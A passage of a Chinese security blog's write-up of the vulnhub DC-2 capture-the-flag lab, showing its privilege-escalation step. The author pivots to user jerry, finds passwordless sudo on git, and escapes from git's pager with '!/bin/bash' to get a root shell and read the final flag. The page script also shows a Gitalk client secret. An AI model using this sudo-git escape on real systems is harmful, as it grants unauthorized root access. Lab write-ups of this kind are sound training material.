class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs bash">tom@DC-2:/home/jerry$ sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> tom: <br>Sorry, try again.<br>[sudo] password <span class="hljs-keyword">for</span> tom: <br>Sorry, user tom may not run sudo on DC-2.<br>tom@DC-2:/home/jerry$ su jerry<br>Password: <br>jerry@DC-2:~$ sudo -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> jerry on DC-2:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User jerry may run the following commands on DC-2:<br>    (root) NOPASSWD: /usr/bin/git<br>jerry@DC-2:~$ sudo PAGER=<span class="hljs-string">&#x27;sh -c &quot;exec sh 0&lt;&amp;1&quot;&#x27;</span> git -p <span class="hljs-built_in">help</span><br>sudo: sorry, you are not allowed to <span class="hljs-built_in">set</span> the following environment variables: PAGER<br>jerry@DC-2:~$ sudo git -p <span class="hljs-built_in">help</span> config<br>GIT-CONFIG(1)                        Git Manual                        GIT-CONFIG(1)<br><br><br>NAME<br>       git-config - Get and <span class="hljs-built_in">set</span> repository or global options<br><br>SYNOPSIS<br>       git config [&lt;file-option&gt;] [<span class="hljs-built_in">type</span>] [-z|--null] name [value [value_regex]]<br>       git config [&lt;file-option&gt;] [<span class="hljs-built_in">type</span>] --add name value<br>       git config [&lt;file-option&gt;] [<span class="hljs-built_in">type</span>] --replace-all name value [value_regex]<br>       git config [&lt;file-option&gt;] [<span class="hljs-built_in">type</span>] [-z|--null] --get name [value_regex]<br>       git config [&lt;file-option&gt;] [<span class="hljs-built_in">type</span>] [-z|--null] --get-all name [value_regex]<br>       git config [&lt;file-option&gt;] [<span class="hljs-built_in">type</span>] [-z|--null] --get-regexp name_regex [value_regex]<br>       git config [&lt;file-option&gt;] [<span class="hljs-built_in">type</span>] [-z|--null] --get-urlmatch name URL<br>       git config [&lt;file-option&gt;] --<span class="hljs-built_in">unset</span> name [value_regex]<br>       git config [&lt;file-option&gt;] --unset-all name [value_regex]<br>       git config [&lt;file-option&gt;] --rename-section old_name new_name<br>!/bin/bash<br>root@DC-2:/home/jerry<span class="hljs-comment"># whoami</span><br>root<br>root@DC-2:/home/jerry<span class="hljs-comment"># uname -a</span><br>Linux DC-2 3.16.0-4-586 <span class="hljs-comment">#1 Debian 3.16.51-3 (2017-12-13) i686 GNU/Linux</span><br>root@DC-2:/home/jerry<span class="hljs-comment"># ip a</span><br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default <br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 08:00:27:b4:be:cb brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.110/24 brd 192.168.56.255 scope global eth0<br>       valid_lft forever preferred_lft forever<br>    inet6 fe80::a00:27ff:feb4:becb/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>root@DC-2:/home/jerry<span class="hljs-comment"># cd ~</span><br>root@DC-2:~<span class="hljs-comment"># ls -la</span><br>total 32<br>drwx------  2 root root 4096 Mar 21  2019 .<br>drwxr-xr-x 21 root root 4096 Mar 10  2019 ..<br>-rw-------  1 root root  207 Mar 21  2019 .bash_history<br>-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc<br>-rw-r--r--  1 root root  427 Mar 21  2019 final-flag.txt<br>-rw-------  1 root root   46 Mar 21  2019 .lesshst<br>-rw-------  1 root root  232 Mar 21  2019 .mysql_history<br>-rw-r--r--  1 root root  140 Nov 19  2007 .profile<br>root@DC-2:~<span class="hljs-comment"># cat final-flag.txt </span><br> __    __     _ _       _                    _ <br>/ / /\ \ \___| | |   __| | ___  _ __   ___  / \<br>\ \/  \/ / _ \ | |  / _` |/ _ \| <span class="hljs-string">&#x27;_ \ / _ \/  /</span><br><span class="hljs-string"> \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/ </span><br><span class="hljs-string">  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/   </span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">Congratulatons!!!</span><br><span class="hljs-string"></span><br><span class="hljs-string">A special thanks to all those who sent me tweets</span><br><span class="hljs-string">and provided me with feedback - it&#x27;</span>s all greatly<br>appreciated.<br><br>If you enjoyed this CTF, send me a tweet via @DCAU7.<br></code></pre></td></tr></table></figure>

<p>成功拿下。</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/05/31/DC-3/">← Next [vulnhub]  DC:3</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/05/27/DC-1/">[vulnhub]  DC:1 Prev →</a></div></div></div><div id="comments"><div class="selector"><button class="gitalk-sel"></button></div><div id="gitalk"></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Dr.T3yT3y</a></h1><div id="description"><p>May the flame guide thee</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%83%A8%E7%BD%B2"><span class="toc-number">2.</span> <span class="toc-text">部署</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">3.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web%E6%B8%97%E9%80%8F"><span class="toc-number">4.</span> <span class="toc-text">web渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">5.</span> <span class="toc-text">提权</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plu</a></nobr><wbr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {gitalk = new Gitalk({
 clientID: 'd746fee266fd40784c87',
 clientSecret: '18467221d189fe0e0b51bd234fcd04785a28ab09',
 repo: 'T3yT3y.github.io',
 owner: 'T3yT3y',
 admin: ['T3yT3y'],
 distractionFreeMode: false,
 id: location.pathname
});
if (document.querySelector("#gitalk")) gitalk.render("gitalk");code.findCode();
document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>